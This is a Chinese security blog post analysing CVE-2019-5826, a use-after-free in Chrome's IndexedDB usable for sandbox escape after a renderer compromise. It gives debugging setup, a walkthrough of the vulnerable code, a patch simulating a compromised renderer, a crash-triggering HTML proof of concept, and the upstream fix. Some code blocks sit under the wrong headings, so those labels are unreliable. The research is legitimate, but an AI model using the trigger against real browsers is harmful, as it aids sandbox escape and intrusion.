\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/RxIOdpRuXvHGDw2UukYGlw)

![](https://mmbiz.qpic.cn/mmbiz_jpg/Ok4fxxCpBb6nMLpJsdx2JaAc4H7HUnBnJE6A7FJW0Fibict4oic3afx1gicAK2gSC0Ccy2lLfIc7HsELatHKOvcviaw/640?wx_fmt=jpeg)

  

  

  

简介

  

  

  

CVE-2019-5826 是 Google Chrome 里 IndexedDB 中的 Use-after-free 漏洞，在版本 73.0.3683.86 之前该漏洞允许攻击者通过搭配 render 的 RCE 漏洞来造成 UAF 并沙箱逃逸。  

-------------------------------------------------------------------------------------------------------------------------------

  

  

  

环境搭建

  

  

  

笔者所使用的 chrome 版本为 73.0.3683.75（点击 “阅读原文” 查看源码）。下载源码并打上 patch，之后编译运行即可 patch 如下。至于为什么要打上 patch，笔者将在下面详细介绍。

```
// third\_party/blink/renderer/modules/indexeddb/web\_idb\_factory\_impl.cc
void WebIDBFactoryImpl::Open(
       std::make\_unique<IndexedDBDatabaseCallbacksImpl>(
           base::WrapUnique(database\_callbacks));
   DCHECK(!name.IsNull());
   factory\_->Open(GetCallbacksProxy(std::move(callbacks\_impl)),
                  GetDatabaseCallbacksProxy(std::move(database\_callbacks\_impl)),
                  name, version, transaction\_id);
+  if (version == 3) {
+    mojom::blink::IDBCallbacksAssociatedPtrInfo ptr\_info;
+    auto request = mojo::MakeRequest(&ptr\_info);
+    factory\_->DeleteDatabase(std::move(ptr\_info), origin, name, true);
+    factory\_->AbortTransactionsForDatabase(origin, base::OnceCallback<void(blink::mojom::IDBStatus)>());
+  }
 }
```

从 chrome 源码中依次复制

indexed\_db\_database.cc

indexed\_db\_factory\_impl.cc

web\_idb\_factory\_impl.cc

indexed\_db\_connection.cc

等文件中的源码，并将其保存至当前目录中的 chromeSrc 文件夹。这样做的目的是为了在调试时可以使用源代码。

没有源码的调试 chrome 实在是太痛苦了 QwQ

老样子，使用 gdb 脚本来辅助调试

```
\# gdbinit
# 读取符号
file ./chrome
# 设置启动参数
set args http://localhost:8000/test.html
# 设置源码路径
directory chromeSrc/
# 设置执行fork后继续调试父进程
set follow-fork-mode parent
```

这里没有设置 --headless，是因为 chrome 单次刷新页面的速度比 gdb 重启 chrome 的速度快上很多，这样每次修改完 exploit/poc 后只需点击刷新即可。

输入以下命令即可开启调试

```
gdb -x gdbinit
```

如果执行时提示 No usable sandbox!，执行以下命令

```
sudo sysctl -w kernel.unprivileged\_userns\_clone=1
```

机器重启后该命令将会失效，届时需要重新执行。

  

  

  

IndexDB 简介

  

Chrome 中 IndexedDB 的大部分是在浏览器进程中实现。浏览器和渲染中都存在几个不同的 mojo IPC 接口，用于进程之间的通信，并且使得沙盒渲染能够执行 IndexedDB 的操作。  

IndexedDBFactory mojo 接口（点击 “阅读原文” 查看链接）是渲染的主要入口点。 大多数操作（打开、关闭数据库等）都是通过 IndexedDBFactory 实例来进一步操作 IndexedDatabase 实例（注意这句话）。

IndexedDB 有关于数据库和连接的概念。对于 Chrome-IndexedDB，分别由 IndexedDBDatabase 和 IndexedDBConnection 类表示。在某一时间段内可以存在对同一数据库的多个连接，但是每个数据库只有一个 IndexedDBDatabase 对象。

另一个要理解的重要概念是请求。打开和删除数据库操作不可能同时发生，但会规划执行相应操作的请求。通过 IndexedDBDatabase::OpenRequest 和 IndexedDBDatabase::DeleteRequest 类可以实现这些功能。  

> OpenRequest 类和 DeleteRequest 类是声明在 IndexedDBDatabase 类中的，换句话说这两个类都是 IndexedDBDatabase 类的子类。

IndexedDBDatabase 对象是一种引用计数（Reference counted）的对象。针对该对象的计数引用被保存在 IndexedDBConnection 对象、IndexedDBTransaction 对象或其他正在进行或待处理的请求对象中。一旦引用计数降至 0，会立即释放对象。

释放数据库对象后，会从数据库映射中删除指向 IndexedDBDatabase 的相应原始指针，这点非常重要。

我们顺便简单了解一下 IndexDB 的 JS API

```
dbName = "mycurrent";
// 打开一个数据库，其中数据库名称为dbName，2为数据库版本
// 返回一个requests，这个request在这里应该是OpenRequest
var request = indexedDB.open(dbName, 2);
// onsuccess是该request处理完成后所执行的回调函数
request.onsuccess = function (event) {
// 当该request执行成功后，request中的result成员为所打开的数据库对象
  db = request.result;
}
// 关闭一个数据库
var deleteRequest = indexedDB.deleteDatabase(dbName);
```

> 具体 IndexedDB 的细节我们将在下节详细讲解。

  

  

  

漏洞分析

  

  

  

### **1\. connections\_成员变量**

在讲解漏洞代码之前，我们先了解一下 IndexedDBDatabase::connections\_成员变量。connections\_集合存储着当前连接至 IndexedDatabase 的所有连接。当有新 connection 连接至数据库，或某个 connection 被中断时，该 connections\_变量都会被修改（执行 insert 或 remove 函数）。而该关键变量是一个 list\_set 类型的成员。

```
class CONTENT\_EXPORT IndexedDBDatabase {
// ...
private:
      list\_set<IndexedDBConnection\*> connections\_;
// ...
```

list\_set 类型是 list 与 set 的结合体，这里我们只需关注该结构体的 end 函数。

```
iterator end() { return iterator(list\_.end()); }
```

可以看到，list\_set::end 函数返回的是 list 的迭代器。

### **2\. databasemap 成员变量**

该成员变量保存了所有指向打开的 IndexedDatabase 的原始指针

> 注意，直接使用 C++ 的原始指针通常是一个比较危险的事情。

```
class CONTENT\_EXPORT IndexedDBFactoryImpl : public IndexedDBFactory {
// ...
private:
// ...
std::map<IndexedDBDatabase::Identifier, IndexedDBDatabase\*> database\_map\_;
}
```

当打开一个新的数据库时，指向该数据库的原始指针将会被添加进 database\_map\_中；同样当关闭一个数据库时，指向该数据库的原始指针将会从 database\_map\_中被移除。

### **3\. 漏洞流程**

#### **a. “悬垂” 指针**

我们先来简单了解一下删除数据库的流程。

当 JS 中执行 indexedDB.deleteDatabase 函数时，通过 render 与 chrome 之间的 IPC 通信，chrome 进程会执行 IndexedDBFactoryImpl::DeleteDatabase 函数，在该函数中，程序会进一步调用对应 IndexedDBDatabase 的 DeleteDatabase 函数来处理对应的数据库。

```
void IndexedDBFactoryImpl::DeleteDatabase(const base::string16& name,        scoped\_refptr<IndexedDBCallbacks> callbacks,const Origin& origin,const base::FilePath& data\_directory,bool force\_close) {  IDB\_TRACE("IndexedDBFactoryImpl::DeleteDatabase");// 每个IndexedDatabase在IndexedDBFactoryImpl类中都有对应唯一的idntifier// 该函数通过数据库名称来获取identifier并进一步在database\_map中查找对应的IndexedDatabase指针  IndexedDBDatabase::Identifier unique\_identifier(origin, name);const auto& it = database\_map\_.find(unique\_identifier);if (it != database\_map\_.end()) {// 如果找到了对应的数据库，则执行该数据库的DeleteDatabase函数    it->second->DeleteDatabase(callbacks, force\_close);return;  }// ...
```

在 IndexedDBDatabase::DeleteDatabase 中，程序会添加一个 DeleteRequest 到当前 IndexedDatabase 中的待处理请求列表中，当数据库处理到 DeleteRequest 时，数据库就会马上关闭。这样做的目的是为了在剩余的请求（DeleteRequest 前的所有请求）全部处理完之后，再关闭当前数据库。

```
void IndexedDBDatabase::DeleteDatabase(
    scoped\_refptr<IndexedDBCallbacks> callbacks,
bool force\_close) {
  AppendRequest(std::make\_unique<DeleteRequest>(this, callbacks));
// Close the connections only after the request is queued to make sure
// the store is still open.
if (force\_close)
    ForceClose();
}
```

但是倘若设置了 force\_close 标志后，则程序将会进一步执行 ForceClose 函数来强制关闭所有的 request 和 connection。但是，第二段用于遍历关闭连接的代码在修改 connections\_时并不安全。（漏洞点!）

```
void IndexedDBDatabase::ForceClose() {// IndexedDBConnection::ForceClose() may delete this database, so hold ref.  scoped\_refptr<IndexedDBDatabase> protect(this);// 循环将所有尚未处理的请求强制关闭while (!pending\_requests\_.empty()) {std::unique\_ptr<ConnectionRequest> request =std::move(pending\_requests\_.front());    pending\_requests\_.pop();    request->AbortForForceClose();  }// 循环将所有连接到当前数据库的connections强制断开// 注意！这段代码在修改connection\_时不够安全auto it = connections\_.begin();while (it != connections\_.end()) {    IndexedDBConnection\* connection = \*it++;// 注意这一步，执行\`connection->ForceClose()\`时，程序会关闭当前连接。// 但倘若当前遍历的连接是connection\_中的最后一条连接，则会执行函数StartUpgrade以建立新连接    connection->ForceClose();  }// 常规检查  DCHECK(connections\_.empty());  DCHECK(!active\_request\_);}
```

在第二个用于关闭 connection 的循环中，程序会执行 connection->ForceClose()，即 IndexedDBConnection::ForceClose 函数，以强制关闭该 connection。而为了在 IndexedDBDatabase 中释放当前连接在数据库中所占用的资源，在这个函数中，程序会进一步调用 IndexedDBDatabase::Close 函数。

```
void IndexedDBConnection::ForceClose() {
if (!callbacks\_.get())
return;

// IndexedDBDatabase::Close() can delete this instance.
  base::WeakPtr<IndexedDBConnection> this\_obj = weak\_factory\_.GetWeakPtr();
  scoped\_refptr<IndexedDBDatabaseCallbacks> callbacks(callbacks\_);
// 注意这条代码
  database\_->Close(this, true /\* forced \*/);
if (this\_obj) {
    database\_ = nullptr;
    callbacks\_ = nullptr;
    active\_observers\_.clear();
  }
  callbacks->OnForcedClose();
}
```

IndexDBDatabase::Close 函数会依次执行一系列操作，但这里我们只关注两个操作。该函数中，程序会先在 connection\_集合中删除当前连接，之后执行 active\_request\_->OnConnectionClosed 函数。

```
void IndexedDBDatabase::Close(IndexedDBConnection\* connection, bool forced) {
  DCHECK(connections\_.count(connection));
  DCHECK(connection->IsConnected());
  DCHECK(connection->database() == this);

  IDB\_TRACE("IndexedDBDatabase::Close");

// 终止当前连接中所有的未完成事务
  connection->FinishAllTransactions(IndexedDBDatabaseError(
      blink::kWebIDBDatabaseExceptionUnknownError, "Connection is closing."));

// 从数据库中的connections\_集合中删除当前request
  connections\_.erase(connection);

// 通知当前正在处理的请求，因为当前请求可能需要进行清理或者继续进行操作
if (active\_request\_)
    active\_request\_->OnConnectionClosed(connection);

// 如果当前数据库中的所有连接和所有请求均已经全部释放完成，则从IndexDBFactory类实例中删除指向当前IndexedDBData的指针
if (connections\_.empty() && !active\_request\_ && pending\_requests\_.empty()) {
    backing\_store\_ = nullptr;
    factory\_->ReleaseDatabase(identifier\_, forced);
  }
}
```

OnConnectionClosed 函数中会先判断当前待处理 connection 是否被过早关闭。

```
void OnConnectionClosed(IndexedDBConnection\* connection) override {
// 如果连接过早关闭（即一个pending的connection被关闭了，此时会调用OnConnectionClosed
if (connection && connection->callbacks() == pending\_->database\_callbacks) {
        pending\_->callbacks->OnError(
            IndexedDBDatabaseError(blink::kWebIDBDatabaseExceptionAbortError,
"The connection was closed."));
// 该连接将在数据库中被重置
        db\_->RequestComplete(this);
return;
    }
// 如果当前connection不是最后一个要处理的连接，则不会执行到StartUpgrade创建新连接。
if (!db\_->connections\_.empty())
return;

    StartUpgrade();
}
```

如果当前连接类型不为 pending connection，即该连接并非被过早关闭（即正常情况，正常情况是比异常情况更容易触发的），并且当前连接为 connections\_中的最后一个连接。则该函数会执行 StartUpgrade 函数，StartUpgrade 函数内部会使得 IndexedDBDatabase 创建一个新的 pending connection 至 connections\_列表中。

```
// Initiate the upgrade. The bulk of the work actually happens in
// IndexedDBDatabase::VersionChangeOperation in order to kick the
// transaction into the correct state.
void StartUpgrade() {
// 使数据库创建一个新的连接
    connection\_ = db\_->CreateConnection(pending\_->database\_callbacks,
                                        pending\_->child\_process\_id);
    DCHECK\_EQ(db\_->connections\_.count(connection\_.get()), 1UL);

    std::vector<int64\_t> object\_store\_ids;

    IndexedDBTransaction\* transaction = connection\_->CreateTransaction(
        pending\_->transaction\_id,
        std::set<int64\_t>(object\_store\_ids.begin(), object\_store\_ids.end()),
        blink::mojom::IDBTransactionMode::VersionChange,
new IndexedDBBackingStore::Transaction(db\_->backing\_store()));
    db\_->RegisterAndScheduleTransaction(transaction);

    transaction->ScheduleTask(
        base::BindOnce(&IndexedDBDatabase::VersionChangeOperation, db\_,
                       pending\_->version, pending\_->callbacks));
}
```

这样，connections\_集合元素将不为 0。当控制流从 OnConnectionClosed 函数返回时，便无法通过下面的判断。这样，就无法执行 factory\_->ReleaseDatabase。  

> 预期情况是，当最后一个连接被 erase 后，一定进入下面的 if 语句以执行 factory\_->ReleaseDatabase，但在这里显然是一个非预期情况。

```
void IndexedDBDatabase::Close(IndexedDBConnection\* connection, bool forced) {
// ...
if (active\_request\_)
    active\_request\_->OnConnectionClosed(connection);

// 如果当前数据库中的所有连接和所有请求均已经全部释放完成，则从IndexDBFactory类实例中删除指向当前IndexedDBData的指针
if (connections\_.empty() && !active\_request\_ && pending\_requests\_.empty()) {
    backing\_store\_ = nullptr;
    factory\_->ReleaseDatabase(identifier\_, forced);
  }
}
```

而 factory\_->ReleaseDatabase 函数会将指向当前数据库的原始指针从 database\_map\_中删除，也就是说，若 IndexedDBFactoryImpl::ReleaseDatabase 不被执行，则该原始指针就一直保存在 database\_map\_中。

```
void IndexedDBFactoryImpl::ReleaseDatabase(
const IndexedDBDatabase::Identifier& identifier,
    bool forced\_close) {
  DCHECK(!database\_map\_.find(identifier)->second->backing\_store());
// 将当前IndexedDatabase原始指针从database\_map中删除
  RemoveDatabaseFromMaps(identifier);

// No grace period on a forced-close, as the initiator is
// assuming the backing store will be released once all
// connections are closed.
  ReleaseBackingStore(identifier.first, forced\_close);
}
```

最终，database\_map\_中保留的原始指针并没有被删除。

同时，当控制流返回 IndexedDBDatabase::ForceClose 函数时，由于 connections\_集合既执行了 erase 函数，又执行了 insert 函数，因此在下一次判断循环条件 it != connections\_.end() 时，connection\_集合中仍然存在 connection（尽管此时的连接非彼时的连接），connection\_集合的元素个数将保持不变。而 end 函数返回的是 list 的迭代器，所以返回的 end 迭代器将保证不变，而 it++，因此将跳出该循环，结束连接的终止操作。但最重要的是，IndexedDBFactoryImpl::database\_map 中仍然保留指向当前数据库的原始指针。该指针本应该在当前循环执行结束时被移除，但这里却没有被移除。

```
void IndexedDBDatabase::ForceClose() {
// ...
auto it = connections\_.begin();
while (it != connections\_.end()) {
    IndexedDBConnection\* connection = \*it++;
// 注意这一步，执行\`connection->ForceClose()\`时，程序会关闭当前连接。
// 但倘若当前遍历的连接是connection\_中的最后一条连接，则会执行函数StartUpgrade以建立新连接
    connection->ForceClose();
  }
// ...
}
```

现在，我们可以成功将指向当前 IndexedDatabase 的一个原始指针保存至本不该保存的地方 (指 database\_map)。而我们下一步要做的就是尝试将当前 IndexedDatabase 所使用的内存释放。

**b. 释放 IndexedDB 内存**

IndexedDBDatabase 对象是一种引用计数（Reference counted）的对象。针对该对象的计数引用被保存在 IndexedDBConnection 对象、IndexedDBTransaction 对象或其他正在进行或待处理的请求对象中。一旦引用计数降至 0，会立即释放对象。（以免忘记，这段又重复了一遍）

```
class CONTENT\_EXPORT IndexedDBConnection {
// ...
// NULL in some unit tests, and after the connection is closed.
  scoped\_refptr<IndexedDBDatabase> database\_;
// ...
};

class CONTENT\_EXPORT IndexedDBTransaction {
// ...
  scoped\_refptr<IndexedDBDatabase> database\_;
// ...
}
```

也就是说，一旦我们将所有与当前 IndexedDBDatabase 对象相关的 Connection 和 Transaction 对象全部释放，那么当前 IndexedDBDatabase 就会因为引用计数为 0 而自动释放。

Issue941746 给出了一种方法 —— 通过调用 IndexedDBFactoryImpl::AbortTransactionsForDatabase 来释放 IndexedDBDatabase 对象。

```
void IndexedDBTransaction::Abort(const IndexedDBDatabaseError& error) {
// ...
  database\_->TransactionFinished(this, false);

// RemoveTransaction will delete |this|.
// Note: During force-close situations, the connection can be destroyed during
// the |IndexedDBDatabase::TransactionFinished| call
// 上面这段注释表示，在\`force\_close = true\`的前提下，执行该函数将会释放connection以及trasaction
if (connection\_)
    connection\_->RemoveTransaction(id\_);
}
```

执行 AbortTransactionsForDatabase 函数将会释放所有的 IndexedDBConnection 以及 IndexedDBTransaction，进而释放 IndexedDatabase 对象，如此就能达到我们想要释放某个 IndexedDatabase 对象的目的。

> 这里贴出 IndexedDBTransaction::Abort 函数的关键代码。请注意函数内部的注释。

```
// third\_party/blink/renderer/modules/indexeddb/web\_idb\_factory\_impl.cc
void WebIDBFactoryImpl::Open(
       std::make\_unique<IndexedDBDatabaseCallbacksImpl>(
           base::WrapUnique(database\_callbacks));
   DCHECK(!name.IsNull());
   factory\_->Open(GetCallbacksProxy(std::move(callbacks\_impl)),
                  GetDatabaseCallbacksProxy(std::move(database\_callbacks\_impl)),
                  name, version, transaction\_id);
+  if (version == 3) {
+    mojom::blink::IDBCallbacksAssociatedPtrInfo ptr\_info;
+    auto request = mojo::MakeRequest(&ptr\_info);
+    factory\_->DeleteDatabase(std::move(ptr\_info), origin, name, true);
+    factory\_->AbortTransactionsForDatabase(origin, base::OnceCallback<void(blink::mojom::IDBStatus)>());
+  }
 }
```

根据上面的分析，我们可以得出，当顺序调用这三个函数时，我们便可以成功使 database\_map 中保存一个指向已被释放内存的悬垂指针。

Open(db1)

DeleteDatabase(db1, force\_close=True)

AbortTransactionsForDatabase

之后，我们只需通过 Heap Spray 将这块被释放的内存重新分配回来即可利用。

但这里有个问题，如何在 render 进程中通过 IndexedDBFactory 来调用这三个函数呢？实际上，render 的 JS 接口可以调用 IndexedDB 的 open 和 deleteDatabase，但无法调用 AbortTransactionsForDatabase 接口。同时，这里存在一个问题，我们无法保证 browser 进程中的函数执行顺序如我们所期待的那样，因为 Js 中 IndexedDB 接口大多都是异步的，因此 browser 中的这三个函数可能无法依次、完全的完成执行。

但我们又必须在 render 进程中依次同步执行这三个函数，而这就是为什么该漏洞只能在 render RCE 的基础上利用的原因了。由于 render RCE 可以给 render 进程自己打上 patch，所以就可以在 render 进程中打 patch 以保证这三个函数可以被同步调用（即依次执行）。  

这也是为什么在环境搭建时要在 chrome 源码中打上 patch 的原因，因为手动打上 patch 可以模拟 render RCE 打 patch 的结果。

```
<html>

<head>
<script type="text/javascript">
async function poc() {
/\*
                在chrome进程中依次同步执行open、deleteDatabase以及AbortTransactionsForDatabase函数
                执行完成后将会产生一个悬垂指针
            \*/
await window.indexedDB.open("db1", 3);
// 尝试使用这个悬垂指针，应该会造成crash
window.indexedDB.deleteDatabase("db1");
        }
</script>
</head>

<body onload="poc()"></body>

</html>
```

#### **d. POC**

笔者在 issue 941746 提供的 poc 上做了一点修改，新构造的 POC 删除了无用的语句，并使 Chrome 触发 Crash

```
@@ -1949,10 +1949,10 @@
     request->AbortForForceClose();
   }

-  auto it = connections\_.begin();
-  while (it != connections\_.end()) {
-    IndexedDBConnection\* connection = \*it++;
+  while (!connections\_.empty()) {
+    IndexedDBConnection\* connection = \*connections\_.begin();
     connection->ForceClose();
+    connections\_.erase(connection);
   }
   DCHECK(connections\_.empty());
   DCHECK(!active\_request\_);
```

Chrome 成功 crash

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6nMLpJsdx2JaAc4H7HUnBn76LOahR7fd1htC4rfm3D1nOas3H4scXSpbPLFnhBIndSbOelocboIg/640?wx_fmt=png)

> 图中多输出的 nice，为 chrome 打 patch 时多添加的一条 printf 语句
> 
> 该语句的输出表示 patch 部分代码被执行。

### **4\. 后记**

以下是 chrome 团队修复后的代码。该 patch 彻彻底底将 connections\_集合中的所有连接全部关闭。patch 前的代码依赖迭代器来判断是否全部关闭所有连接，而 patch 后的代码使用集合元素个数来进行判断，某种程度上使得代码更加安全。

The Most Secure Browser? Pwning Chrome from 2016 to 2019Presentation Slides

White Paper

NVD – CVE-2019-5826 Dtail

Chrome Issue 941746: Security: UAF in content::IndexedDBDatabase

通过 IndexedDB 条件竞争实现 Chrome 沙箱逃逸（上）

（点击 “阅读原文” 查看链接）

> 该文章并没有涉及我们当前所研究的 UAF 漏洞，但即便如此，它仍然提供了一些关于 IndexedDB 相关的说明。

![](https://mmbiz.qpic.cn/mmbiz_png/Ok4fxxCpBb6OLwHohYU7UjX5anusw3ZzxxUKM0Ert9iaakSvib40glppuwsWytjDfiaFx1T25gsIWL5c8c7kicamxw/640?wx_fmt=png)

  

\- End -  

精彩推荐

[Glibc 2.27 关于 Tcache 的增强保护](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649733995&idx=1&sn=f4158430630505b63e207c8e916a37cf&chksm=888c8b04bffb0212861bda310a636da487eb2645b7749014cc04eb9d8453082c29233b35219e&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[美国联邦调查局近期正在对美国医疗卫生保健机构遭受勒索软件攻击的事件进行调查](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649733947&idx=1&sn=d7bd28d6baf399595bc6fcde0927352d&chksm=888c8b54bffb02424bcfa83c061d2a7a5b5f26c05649ca4a752e5ca4a404013a027e176ca059&scene=21#wechat_redirect)
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[快报！坦桑尼亚大选前夕竟出现大规模网络服务中断](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649733938&idx=1&sn=ca4434c41bb1508874928fdf2cb7bae8&chksm=888c8b5dbffb024b61b708bf62f0b12df0afdc655c7bc417ab972b200e81a8d0ff32827e64e2&scene=21#wechat_redirect)
------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

[Windows 内核对象管理全景解析完结](http://mp.weixin.qq.com/s?__biz=MzA5ODA0NDE2MA==&mid=2649733927&idx=1&sn=dff3f6d9039c9a7921f4f5490845ebc6&chksm=888c8b48bffb025e3766f599823c12e8558d7be00ed67559e08ed2cd83143d4d411b4414ff10&scene=21#wechat_redirect)
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------

![](https://mmbiz.qpic.cn/mmbiz_gif/Ok4fxxCpBb5ZMeq0JBK8AOH3CVMApDrPvnibHjxDDT1mY2ic8ABv6zWUDq0VxcQ128rL7lxiaQrE1oTmjqInO89xA/640?wx_fmt=gif)

**戳 “阅读原文” 查看更多内容**